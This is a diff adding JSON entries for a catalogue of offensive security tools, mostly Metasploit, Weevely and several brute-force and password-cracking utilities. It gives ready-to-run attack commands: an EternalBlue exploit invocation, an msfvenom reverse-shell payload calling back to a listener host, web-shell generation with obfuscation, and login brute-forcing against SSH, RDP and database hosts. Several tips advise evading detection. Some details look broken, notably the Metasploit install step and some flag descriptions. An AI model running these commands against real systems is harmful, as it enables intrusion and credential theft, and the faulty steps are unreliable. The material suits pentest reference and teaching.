+    "quick_examples": [
+      {
+        "description": "Basic vulnerability scan",
+        "command": "nuclei -u https://example.com",
+        "notes": []
+      },
+      {
+        "description": "Scan with specific template",
+        "command": "nuclei -u https://example.com -id CVE-2021-44228",
+        "notes": []
+      },
+      {
+        "description": "Scan multiple targets",
+        "command": "nuclei -l targets.txt -severity critical,high",
+        "notes": []
+      },
+      {
+        "description": "Scan with custom templates",
+        "command": "nuclei -u https://example.com -t custom_templates/",
+        "notes": []
+      }
+    ],
+    "common_flags": [
+      {
+        "flag": "-u",
+        "description": "Target URL"
+      },
+      {
+        "flag": "-l",
+        "description": "File with target URLs"
+      },
+      {
+        "flag": "-t",
+        "description": "Template directory or file"
+      },
+      {
+        "flag": "-id",
+        "description": "Specific template ID"
+      },
+      {
+        "flag": "-severity",
+        "description": "Filter by severity level"
+      },
+      {
+        "flag": "-json",
+        "description": "JSON output format"
+      },
+      {
+        "flag": "-o",
+        "description": "Output file"
+      },
+      {
+        "flag": "-rate-limit",
+        "description": "Requests per second"
+      }
+    ],
+    "operational_tips": [
+      "Keep templates updated for latest vulnerability checks.",
+      "Use severity filters to focus on critical findings.",
+      "Create custom templates for organization-specific checks.",
+      "Combine with other scanners for comprehensive coverage."
+    ],
+    "step_sequences": [],
+    "workflow_guides": [],
+    "output_notes": [],
+    "advanced_usage": [],
+    "comparison_table": null,
+    "resources": []
+  },
+  {
+    "id": "lynis",
+    "name": "Lynis",
+    "summary": "Lynis is a security auditing tool for UNIX derivatives like Linux, macOS, BSD, Solaris, AIX, and others.",
+    "installation_guides": [
+      {
+        "platform": "Debian/Ubuntu",
+        "steps": [
+          {
+            "detail": "sudo apt install lynis",
+            "copyable": true
+          }
+        ]
+      },
+      {
+        "platform": "Install from source",
+        "steps": [
+          {
+            "detail": "git clone https://github.com/CISOfy/lynis.git",
+            "copyable": true
+          },
+          {
+            "detail": "cd lynis",
+            "copyable": true
+          },
+          {
+            "detail": "chmod +x lynis",
+            "copyable": true
+          }
+        ]
+      },
+      {
+        "platform": "Run from directory",
+        "steps": [
+          {
+            "detail": "./lynis audit system",
+            "copyable": true
+          }
+        ]
+      }
+    ],
+    "quick_examples": [
+      {
+        "description": "Full system audit",
+        "command": "lynis audit system",
+        "notes": []
+      },
+      {
+        "description": "Scan specific directory",
+        "command": "lynis audit system --scan-dir /opt/app",
+        "notes": []
+      },
+      {
+        "description": "Quick scan with warnings only",
+        "command": "lynis audit system --quick --warnings-only",
+        "notes": []
+      },
+      {
+        "description": "Generate HTML report",
+        "command": "lynis audit system --report-file /tmp/lynis-report.html",
+        "notes": []
+      }
+    ],
+    "common_flags": [
+      {
+        "flag": "audit system",
+        "description": "Perform full system audit"
+      },
+      {
+        "flag": "--scan-dir",
+        "description": "Scan specific directory"
+      },
+      {
+        "flag": "--quick",
+        "description": "Quick scan mode"
+      },
+      {
+        "flag": "--warnings-only",
+        "description": "Show only warnings"
+      },
+      {
+        "flag": "--report-file",
+        "description": "Output report file"
+      },
+      {
+        "flag": "--tests",
+        "description": "Run specific tests"
+      },
+      {
+        "flag": "--check-all",
+        "description": "Check all tests"
+      }
+    ],
+    "operational_tips": [
+      "Run as root for comprehensive system access.",
+      "Review warnings and suggestions for hardening.",
+      "Create baseline scans for change detection.",
+      "Document findings for security compliance."
+    ],
+    "step_sequences": [],
+    "workflow_guides": [],
+    "output_notes": [],
+    "advanced_usage": [],
+    "comparison_table": null,
+    "resources": []
+  },
+  {
+    "id": "unix-privesc-check",
+    "name": "Unix-Privesc-Check",
+    "summary": "Unix-Privesc-Check is a script to check for common privilege escalation vectors on Unix/Linux systems.",
+    "installation_guides": [
+      {
+        "platform": "Install from git",
+        "steps": [
+          {
+            "detail": "git clone https://github.com/pentestmonkey/unix-privesc-check.git",
+            "copyable": true
+          },
+          {
+            "detail": "cd unix-privesc-check",
+            "copyable": true
+          },
+          {
+            "detail": "chmod +x unix-privesc-check",
+            "copyable": true
+          },
+          {
+            "detail": "./unix-privesc-check --help",
+            "copyable": true
+          }
+        ]
+      }
+    ],
+    "quick_examples": [
+      {
+        "description": "Basic privilege escalation check",
+        "command": "./unix-privesc-check",
+        "notes": []
+      },
+      {
+        "description": "Detailed verbose output",
+        "command": "./unix-privesc-check -v",
+        "notes": []
+      },
+      {
+        "description": "Check specific directory",
+        "command": "./unix-privesc-check -d /home/user",
+        "notes": []
+      },
+      {
+        "description": "Save results to file",
+        "command": "./unix-privesc-check -o results.txt",
+        "notes": []
+      }
+    ],
+    "common_flags": [
+      {
+        "flag": "-v",
+        "description": "Verbose output"
+      },
+      {
+        "flag": "-d",
+        "description": "Check specific directory"
+      },
+      {
+        "flag": "-o",
+        "description": "Output file"
+      },
+      {
+        "flag": "-t",
+        "description": "Test mode"
+      },
+      {
+        "flag": "-h",
+        "description": "Show help"
+      }
+    ],
+    "operational_tips": [
+      "Run as different users for comprehensive coverage.",
+      "Document all potential privilege escalation paths.",
+      "Combine with manual verification of findings.",
+      "Use results for system hardening recommendations."
+    ],
+    "step_sequences": [],
+    "workflow_guides": [],
+    "output_notes": [],
+    "advanced_usage": [],
+    "comparison_table": null,
+    "resources": []
+  },
+  {
+    "id": "metasploit",
+    "name": "Metasploit Framework",
+    "summary": "Metasploit Framework is a powerful open-source platform for developing, testing, and executing exploits against remote targets.",
+    "installation_guides": [
+      {
+        "platform": "Install from installer",
+        "steps": [
+          {
+            "detail": "curl https://raw.githubusercontent.com/rapid7/metasploit-framework/master/config/.metasploit-framework -o /usr/local/bin/msfconsole",
+            "copyable": true
+          },
+          {
+            "detail": "chmod +x /usr/local/bin/msfconsole",
+            "copyable": true
+          }
+        ]
+      },
+      {
+        "platform": "Docker",
+        "steps": [
+          {
+            "detail": "docker run -it --rm metasploitframework/metasploit-framework",
+            "copyable": true
+          }
+        ]
+      },
+      {
+        "platform": "Kali Linux (pre-installed)",
+        "steps": [
+          {
+            "detail": "msfconsole",
+            "copyable": true
+          }
+        ]
+      }
+    ],
+    "quick_examples": [
+      {
+        "description": "Launch Metasploit console",
+        "command": "msfconsole",
+        "notes": []
+      },
+      {
+        "description": "Search for exploits",
+        "command": "msfconsole -q -x 'search eternalblue'",
+        "notes": []
+      },
+      {
+        "description": "Use specific exploit",
+        "command": "msfconsole -q -x 'use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS 192.168.1.100; exploit'",
+        "notes": []
+      },
+      {
+        "description": "Generate payload",
+        "command": "msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f exe > payload.exe",
+        "notes": []
+      }
+    ],
+    "common_flags": [
+      {
+        "flag": "-q",
+        "description": "Quiet mode"
+      },
+      {
+        "flag": "-x",
+        "description": "Execute commands"
+      },
+      {
+        "flag": "-r",
+        "description": "Resource script file"
+      },
+      {
+        "flag": "-E",
+        "description": "Environment variables"
+      },
+      {
+        "flag": "-y",
+        "description": "Answer yes to prompts"
+      },
+      {
+        "flag": "-a",
+        "description": "Architecture"
+      },
+      {
+        "flag": "-p",
+        "description": "Platform"
+      }
+    ],
+    "operational_tips": [
+      "Keep database updated for latest exploits.",
+      "Use resource scripts for automated workflows.",
+      "Document all exploitation attempts and results.",
+      "Be aware of legal and ethical considerations."
+    ],
+    "step_sequences": [],
+    "workflow_guides": [],
+    "output_notes": [],
+    "advanced_usage": [],
+    "comparison_table": null,
+    "resources": []
+  },
+  {
+    "id": "searchsploit",
+    "name": "SearchSploit",
+    "summary": "SearchSploit is a command line search tool for Exploit-DB, allowing you to search through exploit database quickly.",
+    "installation_guides": [
+      {
+        "platform": "Debian/Ubuntu",
+        "steps": [
+          {
+            "detail": "sudo apt install exploitdb",
+            "copyable": true
+          }
+        ]
+      },
+      {
+        "platform": "Install from git",
+        "steps": [
+          {
+            "detail": "git clone https://github.com/offensive-security/exploitdb.git",
+            "copyable": true
+          },
+          {
+            "detail": "cd exploitdb",
+            "copyable": true
+          },
+          {
+            "detail": "./searchsploit --help",
+            "copyable": true
+          }
+        ]
+      },
+      {
+        "platform": "Update database",
+        "steps": [
+          {
+            "detail": "searchsploit -u",
+            "copyable": true
+          }
+        ]
+      }
+    ],
+    "quick_examples": [
+      {
+        "description": "Search for Apache exploits",
+        "command": "searchsploit apache",
+        "notes": []
+      },
+      {
+        "description": "Search with specific terms",
+        "command": "searchsploit -t web -p linux kernel",
+        "notes": []
+      },
+      {
+        "description": "Copy exploit to current directory",
+        "command": "searchsploit -m 44918",
+        "notes": []
+      },
+      {
+        "description": "Search by CVE",
+        "command": "searchsploit CVE-2021-44228",
+        "notes": []
+      }
+    ],
+    "common_flags": [
+      {
+        "flag": "-u",
+        "description": "Update exploit database"
+      },
+      {
+        "flag": "-t",
+        "description": "Search by title"
+      },
+      {
+        "flag": "-p",
+        "description": "Platform filter"
+      },
+      {
+        "flag": "-m",
+        "description": "Copy exploit to current directory"
+      },
+      {
+        "flag": "-x",
+        "description": "Exclude exploits"
+      },
+      {
+        "flag": "-n",
+        "description": "Non-interactive mode"
+      },
+      {
+        "flag": "-j",
+        "description": "JSON output"
+      }
+    ],
+    "operational_tips": [
+      "Update database regularly for latest exploits.",
+      "Use specific terms for better search results.",
+      "Verify exploit applicability before use.",
+      "Document exploit sources for attribution."
+    ],
+    "step_sequences": [],
+    "workflow_guides": [],
+    "output_notes": [],
+    "advanced_usage": [],
+    "comparison_table": null,
+    "resources": []
+  },
+  {
+    "id": "commix",
+    "name": "Commix",
+    "summary": "Commix is an automated all-in-one OS command injection and exploitation tool that can be used by web developers, penetration testers, and security researchers.",
+    "installation_guides": [
+      {
+        "platform": "Install from git",
+        "steps": [
+          {
+            "detail": "git clone https://github.com/commixproject/commix.git",
+            "copyable": true
+          },
+          {
+            "detail": "cd commix",
+            "copyable": true
+          },
+          {
+            "detail": "pip3 install -r requirements.txt",
+            "copyable": true
+          },
+          {
+            "detail": "python3 commix.py --help",
+            "copyable": true
+          }
+        ]
+      }
+    ],
+    "quick_examples": [
+      {
+        "description": "Basic command injection test",
+        "command": "python3 commix.py -u 'https://example.com/page.php?id=1'",
+        "notes": []
+      },
+      {
+        "description": "Test POST request",
+        "command": "python3 commix.py -u 'https://example.com/login.php' --data='user=test&pass=test'",
+        "notes": []
+      },
+      {
+        "description": "Use cookie for authentication",
+        "command": "python3 commix.py -u 'https://example.com/page.php?id=1' --cookie='session=abc123'",
+        "notes": []
+      },
+      {
+        "description": "Test with custom user agent",
+        "command": "python3 commix.py -u 'https://example.com/page.php?id=1' --user-agent='Custom Browser 1.0'",
+        "notes": []
+      }
+    ],
+    "common_flags": [
+      {
+        "flag": "-u",
+        "description": "Target URL"
+      },
+      {
+        "flag": "--data",
+        "description": "POST data"
+      },
+      {
+        "flag": "--cookie",
+        "description": "HTTP cookie"
+      },
+      {
+        "flag": "--user-agent",
+        "description": "Custom user agent"
+      },
+      {
+        "flag": "--proxy",
+        "description": "Proxy server"
+      },
+      {
+        "flag": "--batch",
+        "description": "Batch mode (no interaction)"
+      },
+      {
+        "flag": "--level",
+        "description": "Test level (1-3)"
+      },
+      {
+        "flag": "--risk",
+        "description": "Risk level (1-3)"
+      }
+    ],
+    "operational_tips": [
+      "Use batch mode for automated testing.",
+      "Test with different injection techniques.",
+      "Document all command injection findings.",
+      "Be careful with payload execution on production systems."
+    ],
+    "step_sequences": [],
+    "workflow_guides": [],
+    "output_notes": [],
+    "advanced_usage": [],
+    "comparison_table": null,
+    "resources": []
+  },
+  {
+    "id": "weevely",
+    "name": "Weevely",
+    "summary": "Weevely is a stealthy web shell that provides an SSH-like terminal on web servers and can be used for post-exploitation tasks.",
+    "installation_guides": [
+      {
+        "platform": "Install from pip",
+        "steps": [
+          {
+            "detail": "pip3 install weevely",
+            "copyable": true
+          }
+        ]
+      },
+      {
+        "platform": "Install from source",
+        "steps": [
+          {
+            "detail": "git clone https://github.com/epinna/weevely3.git",
+            "copyable": true
+          },
+          {
+            "detail": "cd weevely3",
+            "copyable": true
+          },
+          {
+            "detail": "pip3 install -r requirements.txt",
+            "copyable": true
+          },
+          {
+            "detail": "python3 weevely.py --help",
+            "copyable": true
+          }
+        ]
+      }
+    ],
+    "quick_examples": [
+      {
+        "description": "Generate web shell",
+        "command": "weevely generate password /tmp/shell.php",
+        "notes": []
+      },
+      {
+        "description": "Connect to web shell",
+        "command": "weevely http://example.com/uploads/shell.php password",
+        "notes": []
+      },
+      {
+        "description": "Generate obfuscated shell",
+        "command": "weevely generate password /tmp/shell.php -obfuscator 2",
+        "notes": []
+      },
+      {
+        "description": "Execute command on target",
+        "command": "# After connecting: :shell ls -la",
+        "notes": []
+      }
+    ],
+    "common_flags": [
+      {
+        "flag": "generate",
+        "description": "Generate web shell"
+      },
+      {
+        "flag": "-obfuscator",
+        "description": "Obfuscation level"
+      },
+      {
+        "flag": ":shell",
+        "description": "Execute shell command"
+      },
+      {
+        "flag": ":file_upload",
+        "description": "Upload file"
+      },
+      {
+        "flag": ":file_download",
+        "description": "Download file"
+      },
+      {
+        "flag": ":audit_asp",
+        "description": "Audit ASP files"
+      },
+      {
+        "flag": ":audit_php",
+        "description": "Audit PHP files"
+      }
+    ],
+    "operational_tips": [
+      "Use strong passwords for shell protection.",
+      "Obfuscate shells to avoid detection.",
+      "Clean up shell files after use.",
+      "Document all post-exploitation activities."
+    ],
+    "step_sequences": [],
+    "workflow_guides": [],
+    "output_notes": [],
+    "advanced_usage": [],
+    "comparison_table": null,
+    "resources": []
+  },
+  {
+    "id": "hydra",
+    "name": "Hydra",
+    "summary": "Hydra is a fast network logon cracker that supports numerous protocols including SSH, RDP, FTP, SMB, HTTP, and databases.",
+    "installation_guides": [
+      {
+        "platform": "Debian/Ubuntu",
+        "steps": [
+          {
+            "detail": "sudo apt install hydra",
+            "copyable": true
+          }
+        ]
+      },
+      {
+        "platform": "macOS (Homebrew)",
+        "steps": [
+          {
+            "detail": "brew install hydra",
+            "copyable": true
+          }
+        ]
+      },
+      {
+        "platform": "Build from source",
+        "steps": [
+          {
+            "detail": "git clone https://github.com/vanhauser-thc/thc-hydra.git",
+            "copyable": true
+          },
+          {
+            "detail": "cd thc-hydra && ./configure && make && sudo make install",
+            "copyable": true
+          }
+        ]
+      }
+    ],
+    "quick_examples": [
+      {
+        "description": "SSH brute force",
+        "command": "hydra -L users.txt -P passwords.txt ssh://192.168.1.50",
+        "notes": []
+      },
+      {
+        "description": "HTTP POST form",
+        "command": "hydra -l admin -P passwords.txt 192.168.1.20 http-post-form \"/login:username=^USER^&password=^PASS^:F=Invalid\"",
+        "notes": []
+      },
+      {
+        "description": "FTP login",
+        "command": "hydra -l admin -P passwords.txt ftp://10.0.0.10",
+        "notes": []
+      },
+      {
+        "description": "RDP brute force",
+        "command": "hydra -L users.txt -P passwords.txt rdp://corpdc.local",
+        "notes": []
+      },
+      {
+        "description": "MySQL authentication",
+        "command": "hydra -L users.txt -P passwords.txt mysql://db.internal",
+        "notes": []
+      }
+    ],
+    "common_flags": [
+      {
+        "flag": "-l/-L",
+        "description": "Single username (-l) or username list (-L)"
+      },
+      {
+        "flag": "-p/-P",
+        "description": "Single password (-p) or list (-P)"
+      },
+      {
+        "flag": "-s",
+        "description": "Custom port"
+      },
+      {
+        "flag": "-S/-4/-6",
+        "description": "SSL (-S) or force IPv4/IPv6"
+      },
+      {
+        "flag": "-t",
+        "description": "Parallel tasks (threads)"
+      },
+      {
+        "flag": "-f",
+        "description": "Stop on first valid credential"
+      },
+      {
+        "flag": "-V/-d",
+        "description": "Verbose or debug output"
+      },
+      {
+        "flag": "-o",
+        "description": "Write results to file"
+      },
+      {
+        "flag": "http-post-form",
+        "description": "Module syntax for form-based auth"
+      }
+    ],
+    "operational_tips": [
+      "Verify you are allowed to brute force the service and coordinate with blue teams.",
+      "Tune threads (-t) to respect target stability and lockout policies.",
+      "Use stop-on-success (-f) to reduce noise once credentials are found.",
+      "Combine Hydra with compromised wordlists unique to the engagement."
+    ],
+    "step_sequences": [],
+    "workflow_guides": [],
+    "output_notes": [],
+    "advanced_usage": [],
+    "comparison_table": null,
+    "resources": []
+  },
+  {
+    "id": "medusa",
+    "name": "Medusa",
+    "summary": "Medusa is a speedy, parallel, and modular login brute forcer. It supports many protocols and services.",
+    "installation_guides": [
+      {
+        "platform": "Debian/Ubuntu",
+        "steps": [
+          {
+            "detail": "sudo apt install medusa",
+            "copyable": true
+          }
+        ]
+      },
+      {
+        "platform": "Install from source",
+        "steps": [
+          {
+            "detail": "git clone https://github.com/jmk-foofus/medusa.git",
+            "copyable": true
+          },
+          {
+            "detail": "cd medusa",
+            "copyable": true
+          },
+          {
+            "detail": "./configure && make && sudo make install",
+            "copyable": true
+          }
+        ]
+      }
+    ],
+    "quick_examples": [
+      {
+        "description": "SSH brute force",
+        "command": "medusa -h 192.168.1.100 -u admin -P passwords.txt -M ssh",
+        "notes": []
+      },
+      {
+        "description": "FTP brute force with multiple users",
+        "command": "medusa -h 192.168.1.100 -U users.txt -P passwords.txt -M ftp",
+        "notes": []
+      },
+      {
+        "description": "HTTP basic auth",
+        "command": "medusa -h https://example.com -u admin -P passwords.txt -M http",
+        "notes": []
+      },
+      {
+        "description": "RDP brute force",
+        "command": "medusa -h 192.168.1.100 -U users.txt -P passwords.txt -M rdp",
+        "notes": []
+      }
+    ],
+    "common_flags": [
+      {
+        "flag": "-h",
+        "description": "Target host"
+      },
+      {
+        "flag": "-u/-U",
+        "description": "Username or user file"
+      },
+      {
+        "flag": "-p/-P",
+        "description": "Password or password file"
+      },
+      {
+        "flag": "-M",
+        "description": "Module name"
+      },
+      {
+        "flag": "-m",
+        "description": "Module options"
+      },
+      {
+        "flag": "-t",
+        "description": "Number of threads"
+      },
+      {
+        "flag": "-f",
+        "description": "Stop on successful login"
+      },
+      {
+        "flag": "-v",
+        "description": "Verbose output"
+      }
+    ],
+    "operational_tips": [
+      "Use appropriate thread counts to avoid detection.",
+      "Combine with good wordlists for better success rates.",
+      "Stop on success to reduce noise after finding credentials.",
+      "Document all successful authentication attempts."
+    ],
+    "step_sequences": [],
+    "workflow_guides": [],
+    "output_notes": [],
+    "advanced_usage": [],
+    "comparison_table": null,
+    "resources": []
+  },
+  {
+    "id": "ncrack",
+    "name": "NCrack",
+    "summary": "NCrack is a high-speed network authentication cracking tool that supports many protocols.",
+    "installation_guides": [
+      {
+        "platform": "Debian/Ubuntu",
+        "steps": [
+          {
+            "detail": "sudo apt install ncrack",
+            "copyable": true
+          }
+        ]
+      },
+      {
+        "platform": "Install from source",
+        "steps": [
+          {
+            "detail": "git clone https://github.com/nmap/ncrack.git",
+            "copyable": true
+          },
+          {
+            "detail": "cd ncrack",
+            "copyable": true
+          },
+          {
+            "detail": "./configure && make && sudo make install",
+            "copyable": true
+          }
+        ]
+      }
+    ],
+    "quick_examples": [
+      {
+        "description": "SSH brute force",
+        "command": "ncrack -p 22 --user admin -P passwords.txt 192.168.1.100",
+        "notes": []
+      },
+      {
+        "description": "RDP cracking",
+        "command": "ncrack -p 3389 --user admin -P passwords.txt 192.168.1.100",
+        "notes": []
+      },
+      {
+        "description": "Multiple protocols",
+        "command": "ncrack -p ssh:22,rdp:3389 --user admin -P passwords.txt 192.168.1.100",
+        "notes": []
+      },
+      {
+        "description": "HTTP basic auth",
+        "command": "ncrack -p http --user admin -P passwords.txt https://example.com",
+        "notes": []
+      }
+    ],
+    "common_flags": [
+      {
+        "flag": "-p",
+        "description": "Port and protocol"
+      },
+      {
+        "flag": "--user",
+        "description": "Username"
+      },
+      {
+        "flag": "-P",
+        "description": "Password file"
+      },
+      {
+        "flag": "-U",
+        "description": "Username file"
+      },
+      {
+        "flag": "-T",
+        "description": "Timing template"
+      },
+      {
+        "flag": "-f",
+        "description": "Stop when found"
+      },
+      {
+        "flag": "-v",
+        "description": "Verbose output"
+      },
+      {
+        "flag": "-o",
+        "description": "Output file"
+      }
+    ],
+    "operational_tips": [
+      "Use timing templates to balance speed and stealth.",
+      "Focus on high-value targets for authentication testing.",
+      "Document all discovered credentials securely.",
+      "Be aware of account lockout policies."
+    ],
+    "step_sequences": [],
+    "workflow_guides": [],
+    "output_notes": [],
+    "advanced_usage": [],
+    "comparison_table": null,
+    "resources": []
+  },
+  {
+    "id": "patator",
+    "name": "Patator",
+    "summary": "Patator is a multi-purpose brute-forcer that supports many protocols and services with a modular design.",
+    "installation_guides": [
+      {
+        "platform": "Install from pip",
+        "steps": [
+          {
+            "detail": "pip3 install patator",
+            "copyable": true
+          }
+        ]
+      },
+      {
+        "platform": "Install from source",
+        "steps": [
+          {
+            "detail": "git clone https://github.com/lanjelot/patator.git",
+            "copyable": true
+          },
+          {
+            "detail": "cd patator",
+            "copyable": true
+          },
+          {
+            "detail": "python3 setup.py install",
+            "copyable": true
+          }
+        ]
+      }
+    ],
+    "quick_examples": [
+      {
+        "description": "SSH brute force",
+        "command": "patator ssh_login host=192.168.1.100 user=admin password=FILE0 0=/path/to/passwords.txt",
+        "notes": []
+      },
+      {
+        "description": "HTTP form brute force",
+        "command": "patator http_fuzz url=https://example.com/login.php method=POST body='user=COMBO00&pass=COMBO01' 0=/path/to/users.txt 1=/path/to/passwords.txt",
+        "notes": []
+      },
+      {
+        "description": "FTP brute force",
+        "command": "patator ftp_login host=192.168.1.100 user=admin password=FILE0 0=/path/to/passwords.txt",
+        "notes": []
+      },
+      {
+        "description": "Dictionary attack on URL",
+        "command": "patator http_fuzz url=https://example.com/FUZZ 0=/path/to/wordlist.txt -x ignore:code=404",
+        "notes": []
+      }
+    ],
+    "common_flags": [
+      {
+        "flag": "ssh_login",
+        "description": "SSH login module"
+      },
+      {
+        "flag": "http_fuzz",
+        "description": "HTTP fuzzing module"
+      },
+      {
+        "flag": "ftp_login",
+        "description": "FTP login module"
+      },
+      {
+        "flag": "-x",
+        "description": "Filter results"
+      },
+      {
+        "flag": "-l",
+        "description": "Log file"
+      },
+      {
+        "flag": "-t",
+        "description": "Threads"
+      },
+      {
+        "flag": "-d",
+        "description": "Delay between requests"
+      }
+    ],
+    "operational_tips": [
+      "Use filters to reduce noise and focus on relevant results.",
+      "Adjust thread count to balance speed and detection.",
+      "Log all attempts for analysis and documentation.",
+      "Test with different payload combinations."
+    ],
+    "step_sequences": [],
+    "workflow_guides": [],
+    "output_notes": [],
+    "advanced_usage": [],
+    "comparison_table": null,
+    "resources": []
+  },
+  {
+    "id": "john",
+    "name": "John the Ripper",
+    "summary": "John the Ripper is a fast password cracker, currently available for many flavors of Unix, Windows, DOS, and OpenVMS.",
+    "installation_guides": [
+      {
+        "platform": "Debian/Ubuntu",
+        "steps": [
+          {
+            "detail": "sudo apt install john",
+            "copyable": true
+          }
+        ]
+      },
+      {
+        "platform": "Install from source",
+        "steps": [
+          {
+            "detail": "git clone https://github.com/openwall/john.git",
+            "copyable": true
+          },
+          {
+            "detail": "cd john/src",
+            "copyable": true
+          },
+          {
+            "detail": "./configure && make && sudo make install",
+            "copyable": true
+          }
+        ]
+      }
+    ],
+    "quick_examples": [
+      {
+        "description": "Basic password cracking",
+        "command": "john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt",
+        "notes": []
+      },
+      {
+        "description": "Show cracked passwords",
+        "command": "john --show hash.txt",
+        "notes": []
+      },
+      {
+        "description": "Use specific format",
+        "command": "john --format=raw-md5 --wordlist=wordlist.txt hash.txt",
+        "notes": []
+      },
+      {
+        "description": "Incremental mode attack",
+        "command": "john --incremental hash.txt",
+        "notes": []
+      }
+    ],
+    "common_flags": [
+      {
+        "flag": "--wordlist",
+        "description": "Dictionary attack"
+      },
+      {
+        "flag": "--incremental",
+        "description": "Incremental mode"
+      },
+      {
+        "flag": "--format",
+        "description": "Specify hash format"
+      },
+      {
+        "flag": "--show",
+        "description": "Show cracked passwords"
+      },
+      {
+        "flag": "--rules",
+        "description": "Apply word mangling rules"
+      },
+      {
+        "flag": "--single",
+        "description": "Single crack mode"
+      },
+      {
+        "flag": "--mask",
+        "description": "Mask attack mode"
+      }
+    ],
+    "operational_tips": [
+      "Use wordlists for initial dictionary attacks.",
+      "Apply rules for better password variations.",
+      "Try different formats based on hash type.",
+      "Save cracked passwords securely for later use."
+    ],
+    "step_sequences": [],
+    "workflow_guides": [],
+    "output_notes": [],
+    "advanced_usage": [],
+    "comparison_table": null,
+    "resources": []
+  },
+  {
+    "id": "hashcat",
+    "name": "Hashcat",
+    "summary": "Hashcat is the world's fastest password cracker, supporting hundreds of hash types with GPU acceleration.",
+    "installation_guides": [
+      {
+        "platform": "Debian/Ubuntu",
+        "steps": [
+          {
+            "detail": "sudo apt install hashcat",
+            "copyable": true
+          }
+        ]
+      },
+      {
+        "platform": "Install from source",
+        "steps": [
+          {
+            "detail": "git clone https://github.com/hashcat/hashcat.git",
+            "copyable": true
+          },
+          {
+            "detail": "cd hashcat",
+            "copyable": true
+          },
+          {
+            "detail": "make && sudo make install",
+            "copyable": true
+          }
+        ]
+      }
+    ],
+    "quick_examples": [
+      {
+        "description": "Basic hash cracking",
+        "command": "hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt",
+        "notes": []
+      },
+      {
+        "description": "Show cracked passwords",
+        "command": "hashcat -m 0 hash.txt --show",
+        "notes": []
+      },
+      {
+        "description": "Mask attack",
+        "command": "hashcat -m 0 -a 3 hash.txt ?u?l?d?d?d?d",
+        "notes": []
+      },
+      {
+        "description": "Rule-based attack",
+        "command": "hashcat -m 0 -a 0 -r rules/best64.rule hash.txt wordlist.txt",
+        "notes": []
+      }
+    ],
+    "common_flags": [
+      {
+        "flag": "-m",
+        "description": "Hash type"
+      },
+      {
+        "flag": "-a",
+        "description": "Attack mode"
+      },
+      {
+        "flag": "--show",
+        "description": "Show cracked passwords"
+      },
+      {
+        "flag": "-r",
+        "description": "Rules file"
+      },
+      {
+        "flag": "-o",
+        "description": "Output file"
+      },
+      {
+        "flag": "--force",
+        "description": "Ignore warnings"
+      },
+      {
+        "flag": "-D",
+        "description": "OpenCL devices"
+      }
+    ],
+    "operational_tips": [
+      "Use appropriate hash type (-m) for your target.",
+      "GPU acceleration significantly speeds up cracking.",
+      "Combine wordlists with rules for better success.",
+      "Save cracked hashes and document results."
+    ],
+    "step_sequences": [],
+    "workflow_guides": [],
+    "output_notes": [],
+    "advanced_usage": [],
+    "comparison_table": null,
+    "resources": []
+  },
+  {
+    "id": "fcrackzip",
+    "name": "FCrackZip",
+    "summary": "FCrackZip is a fast password cracker for ZIP archives that supports both brute force and dictionary attacks.",
+    "installation_guides": [
+      {
+        "platform": "Debian/Ubuntu",
+        "steps": [
+          {
+            "detail": "sudo apt install fcrackzip",
+            "copyable": true
+          }
+        ]
+      },
+      {
+        "platform": "Install from source",
+        "steps": [
+          {
+            "detail": "wget http://www.goof.com/zap/fcrackzip-1.0.tar.gz",
+            "copyable": true
+          },
+          {
+            "detail": "tar xzf fcrackzip-1.0.tar.gz",
+            "copyable": true
+          },
+          {
+            "detail": "cd fcrackzip-1.0 && make",
+            "copyable": true
+          }
+        ]
+      }
+    ],
+    "quick_examples": [
+      {
+        "description": "Dictionary attack",
+        "command": "fcrackzip -D -p wordlist.txt archive.zip",
+        "notes": []
+      },
+      {
+        "description": "Brute force attack",
+        "command": "fcrackzip -b -c 'aA1' -l 1-6 archive.zip",
+        "notes": []
+      },
+      {
+        "description": "Use uncompressed size as password",
+        "command": "fcrackzip -u archive.zip",
+        "notes": []
+      },
+      {
+        "description": "Verbose mode",
+        "command": "fcrackzip -v -D -p wordlist.txt archive.zip",
+        "notes": []
+      }
+    ],
+    "common_flags": [
+      {
+        "flag": "-D",
+        "description": "Dictionary attack"
+      },
+      {
+        "flag": "-p",
+        "description": "Password file"
+      },
+      {
+        "flag": "-b",
+        "description": "Brute force"
+      },
+      {
+        "flag": "-c",
+        "description": "Character set"
+      },
+      {
+        "flag": "-l",
+        "description": "Password length"
+      },
+      {
+        "flag": "-u",
+        "description": "Use uncompressed size"
+      },
+      {
+        "flag": "-v",
+        "description": "Verbose output"
+      }
+    ],
+    "operational_tips": [
+      "Try uncompressed size method first - very fast.",
+      "Use good wordlists for dictionary attacks.",
+      "Start with short passwords for brute force.",
+      "Combine multiple techniques for best results."
+    ],
+    "step_sequences": [],
+    "workflow_guides": [],
+    "output_notes": [],
+    "advanced_usage": [],
+    "comparison_table": null,
+    "resources": []
+  },
+  {
+    "id": "pdfcrack",
+    "name": "PDFCrack",
+    "summary": "PDFCrack is a tool for cracking password-protected PDF files using dictionary and brute force attacks.",
+    "installation_guides": [
+      {
+        "platform": "Debian/Ubuntu",
+        "steps": [
+          {
+            "detail": "sudo apt install pdfcrack",
+            "copyable": true
+          }
+        ]
+      },
+      {
+        "platform": "Install from source",
+        "steps": [
+          {
+            "detail": "git clone https://github.com/charlesw1234/pdfcrack.git",
+            "copyable": true
+          },
+          {
+            "detail": "cd pdfcrack",
+            "copyable": true
+          },
+          {
+            "detail": "make && sudo make install",
+            "copyable": true
+          }
+        ]
+      }
+    ],
+    "quick_examples": [
+      {
+        "description": "Dictionary attack",
+        "command": "pdfcrack -f document.pdf -w wordlist.txt",
+        "notes": []
+      },
+      {
+        "description": "Brute force attack",
+        "command": "pdfcrack -f document.pdf -b -c 'aA1' -n 6",
+        "notes": []
+      },
+      {
+        "description": "Continue from saved state",
+        "command": "pdfcrack -f document.pdf -s savedstate.txt",
+        "notes": []
+      },
+      {
+        "description": "Test specific password",
+        "command": "pdfcrack -f document.pdf -p 'testpass'",
+        "notes": []
+      }
+    ],
+    "common_flags": [
+      {
+        "flag": "-f",
+        "description": "PDF file"
+      },
+      {
+        "flag": "-w",
+        "description": "Wordlist file"
+      },
+      {
+        "flag": "-b",
+        "description": "Brute force"
+      },
+      {
+        "flag": "-c",
+        "description": "Character set"
+      },
+      {
+        "flag": "-n",
+        "description": "Maximum length"
